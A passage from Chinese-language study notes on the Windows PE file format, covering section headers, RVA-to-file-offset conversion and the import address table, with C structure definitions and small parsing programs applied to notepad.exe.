src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211204095701399.png" alt="image-20211204095701399"></p><h2 id="13-3-6-节区头"><a href="#13-3-6-节区头" class="headerlink" title="13.3.6 节区头"></a>13.3.6 节区头</h2><p>​节区头中定义了各节区属性。看节区头之前先思考一下：前面提到过，PE文件中的code (代码）、data (数据）、resource (资源）等按照属性分类存储在不同节区，设计PE文件格式的工程师们之所以这样做，一定有着某些好处。</p><p>​我认为把PE文件创建成多个节区结构的好处是，这样可以保证程序的安全性。若把code与data放在一个节区中相互纠缠（实际上完全可以这样做）很容易引发安全问题，即使忽略过程的烦琐。<br>​假如向字符串data写数据时，由于某个原因导致溢出（输入超过缓冲区大小时），那么其下的code (指令）就会被覆盖，应用程序就会崩溃。因此，PE文件格式的设计者们决定把具有相似属性的数据统一保存在一个被称为“节区”的地方，然后需要把各节区属性记录在节区头中（节区属性中有文件&#x2F;内存的起始位置、大小、访问权限等)。</p><p>​换言之，需要为每个code&#x2F;data&#x2F;resource分别设置不同的特性、访问权限等，如下表。</p><table><thead><tr><th>节名</th><th>作用</th></tr></thead><tbody><tr><td>. text&#x2F;.code</td><td>.exe或DLL文件的代码</td></tr><tr><td>. data</td><td>已经初始化的数据</td></tr><tr><td>. edata</td><td>输出文件名表</td></tr><tr><td>. idata</td><td>输入文件名表</td></tr><tr><td>. rdata</td><td>运行期只读数据</td></tr><tr><td>. reloc</td><td>重定位表信息</td></tr><tr><td>. rsrc</td><td>资源</td></tr><tr><td>. bss</td><td>未经初始化的数据</td></tr><tr><td>. crt</td><td>C运行期只读数据</td></tr><tr><td>. debug</td><td>调试信息</td></tr><tr><td>. didata</td><td>延迟输入文件名表</td></tr><tr><td>. tls</td><td>线程的本地存储器</td></tr><tr><td>. xdata</td><td>异常处理表</td></tr></tbody></table><p>​至此，大家应当对节区头的作用有了大致了解。</p><h3 id="IMAGE-SECTION-HEADER"><a href="#IMAGE-SECTION-HEADER" class="headerlink" title="IMAGE_SECTION_HEADER"></a>IMAGE_SECTION_HEADER</h3><p>节区头是由IMAGE_SECTION_HEADER结构体组成的数组，每个结构体对应一个节区。下面代码给出节区头的结构体定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_SECTION_HEADER</span> &#123;</span><br>    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>            DWORD   PhysicalAddress;<br>            DWORD   VirtualSize; <span class="hljs-comment">//内存中所占节区所占大小（内存对齐前的长度）</span><br>    &#125; Misc;<br>    DWORD   VirtualAddress; <span class="hljs-comment">//内存中节区起始地址(RVA)</span><br>    DWORD   SizeOfRawData; <span class="hljs-comment">//磁盘文件中节区所占大小（文件对齐后的长度）</span><br>    DWORD   PointerToRawData; <span class="hljs-comment">//磁盘文件中节区起始位置</span><br>    DWORD   PointerToRelocations;<br>    DWORD   PointerToLinenumbers;<br>    WORD    NumberOfRelocations;<br>    WORD    NumberOfLinenumbers;<br>    DWORD   Characteristics; <span class="hljs-comment">//节区属性(bit OR)</span><br>&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;<br></code></pre></td></tr></table></figure><p>​这里需要说明的是，VirtualAddress与PointerToRawData不带有任何值，分别由（定义在IMAGE_OPTIONAL_HEADER32中的）SectionAlignment与FileAlignment确定。</p><p>​VirtualSize与SizeOfRawData—般具有不同的值，即磁盘文件中节区的大小与加载到内存中的节区大小是不同的。</p><p>​Characteristics由下面代码中中显示的值组合（bit OR)而成。这里只展示了部分重要的节区属性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_SCN_CNT_CODE                   0x00000020  <span class="hljs-comment">// Section contains code.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_SCN_CNT_INITIALIZED_DATA       0x00000040  <span class="hljs-comment">// Section contains initialized data.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_SCN_CNT_UNINITIALIZED_DATA     0x00000080  <span class="hljs-comment">// Section contains uninitialized data.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_SCN_MEM_EXECUTE                0x20000000  <span class="hljs-comment">// Section is executable.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_SCN_MEM_READ                   0x40000000  <span class="hljs-comment">// Section is readable.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_SCN_MEM_WRITE                  0x80000000  <span class="hljs-comment">// Section is writeable.</span></span><br></code></pre></td></tr></table></figure><p>​最后谈谈Name字段。Name成员不像C语言中的字符串一样以NULL结束，并且没有“必须使用ASCII值”的限制。PE规范未明确规定节区的Name,所以可以向其中放入任何值，甚至可以填充NULL值。所以节区的Name仅供参考，不能保证其百分之百地被用作某种信息（数据节区的名称也可叫做.code )。</p><blockquote><p>​讲解PE文件时经常出现“映像”（Image）这一术语，希望各位牢记。PE文件加 栽到内存时，文件不会原封不动地加载，而要根据节区头中定义的节区起始地址、节区大小等加载。因此，磁盘文件中的PE与内存中的PE具有不同形态。将装载到内存中的形态称为“映像”以示区别，使用这一术语能够很好地区分二者</p></blockquote><h3 id="自实现代码解析-2"><a href="#自实现代码解析-2" class="headerlink" title="自实现代码解析"></a>自实现代码解析</h3><p>编写如下代码可以帮助我们分析节表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    FILE *pFile = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">char</span> *buffer;<br>    <span class="hljs-type">int</span> nFileLength = <span class="hljs-number">0</span>;<br>    pFile = fopen(<span class="hljs-string">&quot;C:\\Users\\shinelon\\Desktop\\Caesium.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    fseek(pFile, <span class="hljs-number">0</span>, SEEK_END); <span class="hljs-comment">// 将文件位置指针定位到文件结尾，从SEEK_END开始，偏移0个字节</span><br>    nFileLength = ftell(pFile); <span class="hljs-comment">//返回当前文件位置指针相对于文件开始的距离，在这里就是文件的大小</span><br>    rewind(pFile); <span class="hljs-comment">//将文件位置指针倒回文件开始</span><br>    <span class="hljs-type">int</span> imageLength = nFileLength * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>) + <span class="hljs-number">1</span>;<br>    buffer = (<span class="hljs-type">char</span> *) <span class="hljs-built_in">malloc</span>(imageLength);<br>    <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0</span>, imageLength);<br>    fread(buffer, <span class="hljs-number">1</span>, imageLength, pFile);<br><br>    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) buffer;<br>    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS) (buffer + pDosHeader-&gt;e_lfanew);<br>    PIMAGE_FILE_HEADER pFileHeader = &amp;(pNtHeaders-&gt;FileHeader);<br><br><br>    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; pFileHeader-&gt;NumberOfSections; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Name(区段名称):%s\n&quot;</span>, pSectionHeader[i].Name);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VOffset(起始的相对虚拟地址): %08X\n&quot;</span>, pSectionHeader[i].VirtualAddress);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VSize(区段大小):%08X\n&quot;</span>, pSectionHeader[i].SizeOfRawData);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ROffset(文件偏移):%08X\n&quot;</span>, pSectionHeader[i].PointerToRawData);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;RSize(文件中区段大小): %08X\n&quot;</span>, pSectionHeader[i].Misc.VirtualSize);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;标记(区段的属性):%08X\n\n&quot;</span>, pSectionHeader[i].Characteristics);<br>    &#125;<br>        <span class="hljs-built_in">free</span>(buffer);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>其中IMAGE_FIRST_SECTION是内置的宏定义，摘抄如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FIRST_SECTION( ntheader ) ((PIMAGE_SECTION_HEADER)        \</span><br><span class="hljs-meta">    ((ULONG_PTR)(ntheader) +                                            \</span><br><span class="hljs-meta">     FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) +                 \</span><br><span class="hljs-meta">     ((ntheader))-&gt;FileHeader.SizeOfOptionalHeader   \</span><br><span class="hljs-meta">    ))</span><br></code></pre></td></tr></table></figure><h1 id="13-4-RVAtoRAW"><a href="#13-4-RVAtoRAW" class="headerlink" title="13.4 RVAtoRAW"></a>13.4 RVAtoRAW</h1><p>理解了节区头后，下面继续讲解有关PE文件从磁盘到内存映射的内容。PE文件加载到内存时，每个节区都要能准确完成内存地址与文件偏移间的映射。这种映射一般称为RVA to RAW，方法如下。</p><p>(1)查找RVA所在节区。</p><p>(2)使用简单的公式计算文件偏移（RAW）。根据IMAGE_SECTION_HEADER结构体，换算公式如下：</p><p>RAW - PointerToRawData &#x3D; RVA - VirtualAddress<br>RAW &#x3D; RVA - VirtualAddress + PointerToRawData</p><p>为了便于说明，给出之前的notepad.exe在磁盘中和在内存中的拉伸对比图：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211130142449550.png" alt="image-20211130142449550"></p><p>​这里补充一些东西，一方面我们可以看到这个文件中节区的大小和内存中的是不一样的。这是因为磁盘文件对齐的字节数和内存中的不一样。这里大概可以看出磁盘中对齐字节数是100h，而内存中是4h。</p><p>​另一方面就是书上的Quiz3，题目、答案与解释如下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211130143406915.png" alt="image-20211130143406915"></p><p>像Q3—样，PE文件节区中因VirtualSize与SizeOfRawData值彼此不同而引起的奇怪、有趣的事还有很多（后面会陆续讲到）。</p><blockquote><p>RVA与RAW (文件偏移）间的相互变换是PE头的最基本的内容，各位一定要熟悉并掌握它们之间的转换关系。</p></blockquote><h2 id="自实现代码解析-3"><a href="#自实现代码解析-3" class="headerlink" title="自实现代码解析"></a>自实现代码解析</h2><p>我们也可以根据如上方法论编写地址转换函数，从代码也不难看出此代码也存在Q3类似的问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">DWORD <span class="hljs-title function_">RVAtoFOA</span><span class="hljs-params">(IN LPVOID pFileBuffer, IN DWORD dwRVA)</span> &#123;<br>    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) pFileBuffer;<br>    PIMAGE_FILE_HEADER pPEHeader = (PIMAGE_FILE_HEADER) (pDosHeader-&gt;e_lfanew + (DWORD) pFileBuffer + <span class="hljs-number">4</span>);<br>    PIMAGE_OPTIONAL_HEADER32 pOptionHeader = (PIMAGE_OPTIONAL_HEADER32) ((DWORD) pPEHeader + IMAGE_SIZEOF_FILE_HEADER);<br>    PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER) ((DWORD) pOptionHeader + pPEHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">// RVA在文件头中时，RVA==FOA √</span><br>    <span class="hljs-comment">// 或者文件对齐==内存对齐时，RVA==FOA  × （比如当 Misc&gt;SizeOfRawData）</span><br>    <span class="hljs-keyword">if</span> (dwRVA &lt; pOptionHeader-&gt;SizeOfHeaders) &#123;<br>        <span class="hljs-keyword">return</span> dwRVA;<br>    &#125;<br><br>    <span class="hljs-comment">// 遍历节表，确定偏移属于哪一个节</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; pPEHeader-&gt;NumberOfSections; i++) &#123;<br>        <span class="hljs-keyword">if</span> (dwRVA &gt;= pSectionHeader[i].VirtualAddress &amp;&amp; dwRVA &lt; pSectionHeader[i].VirtualAddress + pSectionHeader[i].Misc.VirtualSize) &#123;<br>            <span class="hljs-type">int</span> offset = dwRVA - pSectionHeader[i].VirtualAddress;<br>            <span class="hljs-keyword">return</span> pSectionHeader[i].PointerToRawData + offset;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;找不到RVA %x 对应的 FOA，转换失败\n&quot;</span>, dwRVA);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="13-5-IAT"><a href="#13-5-IAT" class="headerlink" title="13.5 IAT"></a>13.5 IAT</h1><p>   刚开始学习PE头时，最难过的一关就是IAT (Import Address Table,导入地址表)。IAT保存的内容与Windows操作系统的核心进程、内存、DLL结构等有关。换句话说，只要理解了IAT，就掌握了Windows操作系统的根基。简言之，IAT是一种表格，用来记录程序正在使用哪些库中的哪些函数。</p><h2 id="13-5-1-DLL"><a href="#13-5-1-DLL" class="headerlink" title="13.5.1 DLL"></a>13.5.1 DLL</h2><p>​讲解IAT前先学习一下有关DLL ( Dynamic Linked Library )的知识（知其所以然，才更易理解），它支撑起了整座Windows OS大厦。DLL翻译成中文为“动态链接库”，为何这样称呼呢？16位的DOS时代不存在DLL这一概念，只有“库”（Library )—说。比如在C语言中使用printf()函数时，编译器会先从C库中读取相应函数的二进制代码，然后插入（包含到）应用程序。也就是说，可执行文件中包含着printf()函数的二进制代码。Windows OS支持多任务，若仍采用这种包含库的方式，会非常没有效率。Windows操作系统使用了数量庞大的库函数（进程、内存、窗口、消息等）来支持32位的Windows环境。同时运行多个程序时，若仍像以前一样每个程序运行时都包含相同的库，将造成严重的内存浪费（当然磁盘空间的浪费也不容小觑)。因此，WindowsOS设计者们根据需要引入了DLL这一概念，描述如下。</p><ul><li>不要把库包含到程序中，单独组成DLL文件，需要时调用即可。 </li><li>内存映射技术使加载后的DLL代码、资源在多个进程中实现共享。</li><li>更新库时只要替换相关DLL文件即可，简便易行。加载DLL的方式实际有两种：一种是“显式链接”（ExplicitLinking)，程序使用DLL时加载，使用完毕后释放内存；另一种是“隐式链接” (Implicit Linking ),程序开始时即一同加载DLL,程序终止时再释放占用的内存。IAT提供的机制即与隐式链接有关。下面使用OllyDbg打开notepad.exe来查看IAT。图13-10是调用CreateFileW()函数的代码，该函数位于kernel32.dll中。</li></ul><p>​调用CreateFileW()函数时并非直接调用，而是通过获取01001104地址处的值来实现（所有API调用均采用这种方式)。地址01001104是notepad.exe中.text节区的内存区域（更确切地说是IAT内存区域）。01001104地址的值为7C8107F0，而7C8107F0地址即是加载到notepad.exe进程内存中的CreateFileW()函数（位于kernel32.dll库中）的地址。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211201114904108.png" alt="image-20211201114904108"></p><p>​此处产生一个疑问。</p><p>​“直接使用CALL 7C8107F0指令调用函数不是更好、更方便吗？”</p><p>​甚至还会有入问：“编译器直接写CALL 77E2CC56不是更准确、更好吗？”这是前面说过的DOS时代的方式。事实上，notepad.exe程序的制作者编译（生成）程序时，并不知道该notepad.exe程序要运行在哪种Windows ( 9X、2K、XP、Vista、7 )、哪种语言（ENG、JPN、KOR等）、哪种服务包（ServicePack)下。上面列举出的所有环境中，kernel32.dll的版本各不相同，CreateFileW()函数的位置（地 址）也不相同。为了确保在所有环境中都能正常调用CreateFileW()函数，编译器准备了要保存CreateFileW()函数实际地址的位置（ 10001124)，并仅记下CALL DWORD PTR DS:[10001124]形式的指令。执行文件时，PE装载器将CreateFileWO函数的地址写到10001124位置。</p><p>​编译器不使用CALL 77E2CC56语句的另一个原因在于DLL重定位。DLL文件的ImageBase值一般为10000000。比如某个程序使用a.dll与b.dll时，PE装载器先把a.dll装载到内存的10000000(ImageBase)处，然后尝试把b.dll也装载到该处。但是由于该地址处已经装载了a.dll，所以PE装载器查找其他空白的内存空间（ex:3E000000 )，然后将b.dll装载进去。</p><p>​这就是所谓的DLL重定位，它使我们无法对实际地址硬编码。另一个原因在于，PE头中表示地址时不使用VA，而是RVA。</p><blockquote><p>实际操作中无法保证DLL —定会被加载到PE头内指定的ImageBase处。但是EXE文件（生成进程的主体）却能准确加载到自身的ImageBase中，因为它拥有自己的虚拟空间。</p></blockquote><p>​PE头的IAT是代码逆向分析的核心内容。希望各位好好理解它。相信大家现在已经能够掌握IAT的作用了（后面讲解IAT结构为什么如此复杂时，希望各位也能很快了解）。</p><h2 id="13-5-2-IMAGE-IMPORT-DESCRIPTOR"><a href="#13-5-2-IMAGE-IMPORT-DESCRIPTOR" class="headerlink" title="13.5.2 IMAGE_IMPORT_DESCRIPTOR"></a>13.5.2 IMAGE_IMPORT_DESCRIPTOR</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//@[comment(&quot;MVI_tracked&quot;)]</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        DWORD   Characteristics;            <span class="hljs-comment">// 0 for terminating null import descriptor</span><br>        DWORD   OriginalFirstThunk;         <span class="hljs-comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span><br>        <span class="hljs-comment">// In other words, INT(Import Name Table)</span><br>    &#125; DUMMYUNIONNAME;<br>    DWORD   TimeDateStamp;                  <span class="hljs-comment">// 0 if not bound,</span><br>                                            <span class="hljs-comment">// -1 if bound, and real date\time stamp</span><br>                                            <span class="hljs-comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span><br>                                            <span class="hljs-comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span><br><br>    DWORD   ForwarderChain;                 <span class="hljs-comment">// -1 if no forwarders</span><br>    DWORD   Name;<br>    DWORD   FirstThunk;                     <span class="hljs-comment">// RVA to IAT (if bound this IAT has actual addresses)</span><br>    <span class="hljs-comment">// IAT(Import Address Table)</span><br>&#125; IMAGE_IMPORT_DESCRIPTOR;<br><span class="hljs-keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;<br></code></pre></td></tr></table></figure><p>​执行一个普通程序时往往需要导入多个库，导入多少库就存在多少个IMAGE_IMPORT_DESCRIPTOR结构体，这些结构体形成了数组，且结构体数组最后以NULL结构体结束。IMAGE_IMPORT_DESCRIPTOR中的重要成员如表13-5所示（拥有全部RVA值)。</p><p>​其中的重要成员如下所示：</p><ul><li>OriginalFirstThunk：INT的地址（RVA)</li><li>Name：库名称字符串的地址（RVA)</li><li>FirstThunk：IAT的地址（RVA)</li></ul><blockquote><p>• PE头中提到的“Table”即指数组。<br>• INT与IAT是长整型（4个字节数据类型）数组，以NULL结束（未另外明确指出<br>大小）。<br>• INT中各元素的值为IMAGE_IMPORT_BY_NAME结构体指针（有时IAT也拥有<br>相同的值)。<br>• INT与IAT的大小应相同。</p></blockquote><p>下图描述了notepad.exe之kernel32.dll的IMAGE_IMPORT_DESCRIPTOR结构。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211201125729065.png" alt="image-20211201125729065"></p><p>​上图中，INT与IAT的各元素同时指向相同地址，但也有很多情况下它们是不一致的（后面会陆续接触很多变形的PE文件，到时再逐一讲解)。但至少在我们的notepad分析中，这两者是一致的。<br>​下面了解一下PE装载器把导入函数输入至IAT的顺序。</p><ul><li>1.读取IID的Name成员，获取库名称字符串kernel32.dll）。</li><li>2.装载相应库。 <ul><li>LoadLibrary(“kernel32.dll”）</li></ul></li><li>3.读取IID的OriginalFirstThunk成员，获取INT地址。</li><li>4.逐一读取INT中数组的值，获取相应IMAGE_IMPORT_BY_NAME地址（RVA）。</li><li>5.使用IMAGE_IMPORT_BY_NAME的Hint (ordinal)或fame项，获取相应函数的起始地址。<ul><li>GetProcAddress(“GetCurrentThreadld”)</li></ul></li><li>6.读取IID的FirstThunk (IAT)成员.获得IAT地址。</li><li>7.将上面获得的函数地址输入相应IAT数组值。 </li><li>8.重复以上步骤4~7,直到INT结束（遇到NULL时）。</li></ul><h2 id="13-5-3-notepad分析"><a href="#13-5-3-notepad分析" class="headerlink" title="13.5.3 notepad分析"></a>13.5.3 notepad分析</h2><p>​下面以notepad.exe为对象逐一查看。先提一个问题：IMAGE_IMPORT_DESCRIPTOR结构体数组究竟存在于PE文件的哪个部分呢？</p><p>​它不在PE头而在PE体中（在.idata段里），但查找其位置的信息在PE头中，IMAGE_OPTIONAL_HEADER32.DataDirectory[1].VirtualAddress的值即是IMAGE_IMPORT_DESCRIPTOR结构体数组的起始地址(RVA值)。IMAGE_IMPORT_DESCRIPTOR结构体数组也被称为IMPORT Directory Table (只有了解上述全部称谓，与他入交流时才能没有障碍)。</p><p>​使用010editor对文件进行查看，找到导入表的RVA地址。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211201134456381.png" alt="image-20211201134456381"></p><p>​使用之前提到的RVAtoFOA函数对地址进行转换，找到导入表实际位置在文件中的偏移起始地址为2367C。由该地址开始引出一条的链，该链上的每一个块对应着一个DLL和通过这个DLL导入的一堆函数，以及一个IMAGE_IMPORT_DESCRIPTOR结构体。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211201142440842.png" alt="image-20211201142440842"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211201165502730.png" alt="image-20211201165502730"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//@[comment(&quot;MVI_tracked&quot;)]</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        DWORD   Characteristics;            <span class="hljs-comment">// 0 for terminating null import descriptor</span><br>        DWORD   OriginalFirstThunk;         <span class="hljs-comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span><br>    &#125; DUMMYUNIONNAME;<br>    DWORD   TimeDateStamp;                  <span class="hljs-comment">// 0 if not bound,</span><br>                                            <span class="hljs-comment">// -1 if bound, and real date\time stamp</span><br>                                            <span class="hljs-comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span><br>                                            <span class="hljs-comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span><br><br>    DWORD   ForwarderChain;                 <span class="hljs-comment">// -1 if no forwarders</span><br>    DWORD   Name;<br>    DWORD   FirstThunk;                     <span class="hljs-comment">// RVA to IAT (if bound this IAT has actual addresses)</span><br>&#125; IMAGE_IMPORT_DESCRIPTOR;<br></code></pre></td></tr></table></figure><p>​将几个成员的值提取如下：</p><table><thead><tr><th align="center">文件偏移</th><th align="center">成员</th><th align="center">RVA</th><th align="center">FOA（RAW）</th></tr></thead><tbody><tr><td align="center">367C</td><td align="center">OriginalFirstThunk（INT）</td><td align="center">26700</td><td align="center">23900</td></tr><tr><td align="center">3680</td><td align="center">TimeDateStamp</td><td align="center">0</td><td align="center">-</td></tr><tr><td align="center">3684</td><td align="center">ForwarderChain</td><td align="center">0</td><td align="center">-</td></tr><tr><td align="center">3688</td><td align="center">Name</td><td align="center">27110</td><td align="center">24310</td></tr><tr><td align="center">368C</td><td align="center">FirstThunk（IAT）</td><td align="center">26068</td><td align="center">23268</td></tr></tbody></table><p>​依此看看下面的这些文件吧。</p><ol><li>库名称（Name)</li></ol><p>​Name是一个字符串指针，它指向导入函数所属的库文件名称。在下图文件偏移24310(RVA:27110→RAW:24310)处看到字符串KERNEL32.dll了吧？</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211201185152884.png" alt="image-20211201185152884"></p><ol start="2"><li>OriginalFirstThunk - INT</li></ol><p>​INT是一个包含导入函数信息(Ordinal, Name)的结构体指针数组。只有获得了这些信息，才能在加载到进程内存的库中准确求得相应函数的起始地址（请参考后面EAT的讲解）。</p><p>​跟踪OriginalFirstThunk成员（RVA:26700→RAW:23900)。 结果如下。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211202105556623.png" alt="image-20211202105556623"></p><p>​上图实际上就是INT，它由地址数组形式组成（数组尾部以NULL结束）。该地址数组实际上也有一个结构体IMAGE_THUNK_DATA来指代。这里我们使用的是AddressOfData的变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//@[comment(&quot;MVI_tracked&quot;)]</span><br><span class="hljs-keyword">typedef</span> 